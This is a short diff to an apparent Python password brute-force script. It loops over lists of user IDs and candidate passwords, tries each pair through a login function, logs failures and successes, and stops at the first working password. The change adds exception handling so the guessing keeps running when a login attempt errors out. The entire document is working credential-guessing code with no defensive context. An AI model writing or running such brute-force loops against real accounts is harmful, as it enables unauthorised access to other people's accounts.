@@ -32,9 +32,14 @@ if __name__ == '__main__':
 	for id in IDlist :
 		logFile.write('start explode for id='+ id +'\n')		
 		for pw in PWlist :
-			rtn = login.Login(id, pw)	
-			if rtn is False :
-				logFile.write('for id= ' + id + ' pw= '+ pw + ' is failed\n')
-			else :
-				logFile.write('FOR ID= ' + id + ' PW= '+ pw + ' IS SUCCESSED\n')
-				break				
+			try :
+				rtn = login.Login(id, pw)
+			except :
+				logFile.write('for id= ' + id + ' pw= '+ pw + ' is Exception\n')
+				rtn = False
+			finally:	
+				if rtn is False :
+					logFile.write('for id= ' + id + ' pw= '+ pw + ' is failed\n')
+				else :
+					logFile.write('FOR ID= ' + id + ' PW= '+ pw + ' IS SUCCESSED\n')
+					break
